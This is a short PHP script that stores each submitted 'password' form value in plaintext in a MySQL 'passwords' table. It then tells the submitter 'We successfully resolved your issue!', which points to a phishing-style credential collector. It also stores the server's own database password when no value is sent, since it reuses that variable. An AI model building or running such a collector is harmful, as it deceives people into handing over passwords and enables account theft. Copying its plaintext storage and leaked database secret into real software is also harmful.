<?php

declare(strict_types=1);

require_once('vendor/autoload.php');

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$servername = "localhost";
$username = $_ENV["DB_USER"]; 
$password = $_ENV["DB_PASS"];
$dbname = $_ENV["DB_NAME"];

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
	die("Connection failed: " . $conn->connect_error);
}

// handling POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$pass_req = $_POST["password"];

	if ($pass_req != null) {
		$password = $pass_req;
	}

	// preparing insertion statement
	$stmt = $conn->prepare("INSERT INTO passwords (password) VALUES (?)");
	$stmt->bind_param("s", $password);
	
	if($stmt->execute()) {
		echo "We successfully resolved your issue!";
	} else {
		echo "Uh oh. An internal error occurred. Please try again.";
	}
	$stmt->close();
}

$conn->close();
?>
